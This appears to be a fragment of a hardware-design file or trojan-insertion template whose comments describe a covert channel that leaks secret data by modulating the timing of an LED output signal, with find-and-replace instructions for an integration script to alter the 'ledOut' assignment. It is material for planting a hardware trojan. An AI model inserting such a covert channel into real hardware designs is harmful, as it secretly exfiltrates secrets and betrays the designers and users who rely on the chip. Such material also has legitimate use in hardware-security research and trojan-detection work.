 ...
 * Payload: Modulate timing of ledOut based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of ledOut
//
// Integration Script Must Modify:
//
// IF ledOut is timing-sensitive:
//   Find: assign ledOut = ready_signal;
//   Replace: assign ledOut = (timing_delay == 0) ? ready_signal : 1'b0;
//
